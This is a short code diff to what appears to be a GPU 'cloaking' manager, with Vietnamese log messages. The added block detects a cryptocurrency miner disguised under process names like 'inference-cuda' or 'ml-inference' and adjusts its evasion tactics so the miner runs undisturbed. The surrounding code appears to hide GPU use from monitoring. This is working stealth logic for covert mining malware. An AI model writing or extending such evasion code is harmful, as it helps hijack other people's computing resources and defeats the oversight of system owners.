@@ -343,6 +343,27 @@ class GPUCloakingManager:
         active_strategies = [k for k, v in self.strategies_status.items() if v]
         logger.info("🎭 Các chiến lược cloaking đang hoạt động: %s", ', '.join(active_strategies))
 
+        # ✅ Check if target PID is mining process - skip time-based evasion
+        is_mining_process = False
+        try:
+            with open(f"/proc/{self.pid}/cmdline", 'r') as f:
+                cmdline = f.read()
+            
+            # Skip time-based evasion for mining processes
+            if "inference-cuda" in cmdline or "ml-inference" in cmdline:
+                is_mining_process = True
+                logger.info(f"🎮 [MINING-EXCLUSION] Detected mining process PID {self.pid} - skipping time-based evasion")
+                logger.info(f"🎮 [MINING-EXCLUSION] Command line: {cmdline.strip()}")
+                
+                # Keep other cloaking strategies active but skip SIGSTOP/SIGCONT cycling
+                while not self.stop_event.is_set():
+                    time.sleep(30)  # Just monitor, don't interfere with mining
+                    
+                logger.info(f"🎮 [MINING-EXCLUSION] Mining process monitoring ended for PID {self.pid}")
+                return
+        except (OSError, IOError):
+            logger.debug(f"Could not read cmdline for PID {self.pid} - proceeding with normal time-based evasion")
+
         while not self.stop_event.is_set():
             # Resume process
             try:
